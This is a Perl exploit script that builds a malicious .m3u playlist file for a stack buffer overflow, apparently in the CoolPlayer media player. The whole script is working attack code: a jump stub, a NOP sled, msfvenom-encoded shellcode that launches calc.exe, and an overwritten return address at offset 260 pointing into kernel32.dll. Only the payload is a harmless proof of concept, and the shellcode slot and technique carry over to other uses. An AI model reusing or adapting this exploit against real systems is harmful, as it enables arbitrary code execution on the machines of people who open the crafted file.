#!/usr/bin/perl

my $buffsize = 10000; #set consistent buffer size

my $jmp = "\x83\xec\x64" x 2; #decrement esp by 200
$jmp = $jmp . "\x83\xec\x28"; #decrement esp by 40
$jmp = $jmp . "\xff\xe4"; #jmp esp

#msfvenom -a x86 -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -b '\x00\x0a\x0d\xff' -f perl

my $shell = "\xbb\xa4\x12\xda\x1e\xda\xc5\xd9\x74\x24\xf4\x5f\x29\xc9" .
"\xb1\x31\x31\x5f\x13\x83\xef\xfc\x03\x5f\xab\xf0\x2f\xe2" .
"\x5b\x76\xcf\x1b\x9b\x17\x59\xfe\xaa\x17\x3d\x8a\x9c\xa7" .
"\x35\xde\x10\x43\x1b\xcb\xa3\x21\xb4\xfc\x04\x8f\xe2\x33" .
"\x95\xbc\xd7\x52\x15\xbf\x0b\xb5\x24\x70\x5e\xb4\x61\x6d" .
"\x93\xe4\x3a\xf9\x06\x19\x4f\xb7\x9a\x92\x03\x59\x9b\x47" .
"\xd3\x58\x8a\xd9\x68\x03\x0c\xdb\xbd\x3f\x05\xc3\xa2\x7a" .
"\xdf\x78\x10\xf0\xde\xa8\x69\xf9\x4d\x95\x46\x08\x8f\xd1" .
"\x60\xf3\xfa\x2b\x93\x8e\xfc\xef\xee\x54\x88\xeb\x48\x1e" .
"\x2a\xd0\x69\xf3\xad\x93\x65\xb8\xba\xfc\x69\x3f\x6e\x77" .
"\x95\xb4\x91\x58\x1c\x8e\xb5\x7c\x45\x54\xd7\x25\x23\x3b" .
"\xe8\x36\x8c\xe4\x4c\x3c\x20\xf0\xfc\x1f\x2e\x07\x72\x1a" .
"\x1c\x07\x8c\x25\x30\x60\xbd\xae\xdf\xf7\x42\x65\xa4\x08" .
"\x09\x24\x8c\x80\xd4\xbc\x8d\xcc\xe6\x6a\xd1\xe8\x64\x9f" .
"\xa9\x0e\x74\xea\xac\x4b\x32\x06\xdc\xc4\xd7\x28\x73\xe4" .
"\xfd\x4a\x12\x76\x9d\xa2\xb1\xfe\x04\xbb";

my $nops = "\x90" x (260 - ((length($jmp) + length($shell)))); #260 is offset to eip
my $eip = pack('V', 0x7c810395); #call ebx from kernel32.dll

my $sploit = $jmp.$nops.$shell.$eip; #build sploit portion of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer for size consistency
my $buffer = $sploit.$fill; # build final buffer

# write the exploit buffer to file

my $file = "coolplayershell_subregjump_calc.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer size: " . length($buffer). "\n";
